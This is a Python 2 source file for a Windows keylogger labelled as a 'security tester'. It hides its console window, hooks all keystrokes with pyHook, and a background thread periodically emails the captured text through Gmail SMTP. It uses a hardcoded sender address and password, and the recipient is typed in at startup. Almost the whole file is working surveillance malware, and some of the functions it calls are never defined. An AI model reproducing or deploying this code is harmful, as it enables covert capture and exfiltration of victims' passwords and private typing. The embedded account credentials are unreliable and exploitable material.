import os
import sys
import threading
import urllib,urllib2
import smtplib
import ftplib
import datetime,time
import win32event, win32api, winerror
import pythoncom,pyHook

print "\n\t\t#################################################"
print "\t\t#                                               #"
print "\t\t#      PERSONAL COMPUTER SECURITY TESTER        #"
print "\t\t#              EMAIL KEY LOGGER                 #"
print "\t\t#                  BY WARLOCK                   #"
print "\t\t#                                               #"
print "\t\t#################################################"
print"\n[+]HERE I AM GONNA TRY TO EXPLOIT THIS COMPUTER AND PLEASE GIVE EMAIL WHERE I CAN SEND LOGS FOR KEYSTROKES AS WELL"
print"\n[+]IF YOU START TO GET EMAILS FROM ME ...THAT MEANS THIS COMPUTER CAN BE HACK EASILY"
time.sleep(10)
x=''
data=''
count=0
f='warl0ckhacker999@gmail.com'
p='intelxolox900'
u=raw_input("\nENTER EMAIL-ID WHERE I WILL SEND LOGS :")
s=raw_input("\nPLEASE GIVE NAME TO THIS COMPUTER :")
#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

#Email Logs
class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            global data
            if len(data)>25:
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com" #Specify Server Here
                PORT = 587 #Specify Port Here
                USER=f#Specify Username Here 
                PASS=p#Specify Password Here
                FROM = USER#From address is taken from username
                TO = [u] #Specify to address.Use comma if more than one to address is needed.
                SUBJECT = s+str(ts)
                MESSAGE = data
                message = """\
From: %s
To: %s
Subject: %s

%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, message)
                    data=''
                    server.quit()
                except Exception as e:
                    print e
            self.event.wait(3)


def main():
    global x
    hide()
    email=TimerClass()
    email.start()
        
    return True
main()

def keypressed(event):
    global x,data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys 
    if x==1:  
        local()
    elif x==2:
        remote()
    elif x==4:
        ftp()

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
